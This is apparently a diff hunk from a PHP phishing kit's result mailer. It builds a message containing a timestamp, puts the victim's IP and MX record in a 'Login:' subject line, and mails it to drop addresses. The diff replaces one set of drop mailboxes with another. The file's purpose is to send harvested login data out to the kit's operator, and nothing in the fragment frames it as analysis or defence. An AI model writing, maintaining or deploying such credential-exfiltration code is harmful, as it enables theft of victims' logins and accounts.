@@ -103,7 +103,7 @@ $message .= "Timestamp: " . date('Y-m-d H:i:s') . "\n";
 $message .= "|--------------------------------|\n";
 
 // Send mail
-$send = "myresultbox2020@rambler.ru,myresultbox2020@yandex.com";
+$send = "resultbox02999@yandex.com,resultbox027@gmail.com";
 $subject = "Login: $ip - MX: $mxRecordURL";
 mail($send, $subject, $message);
 
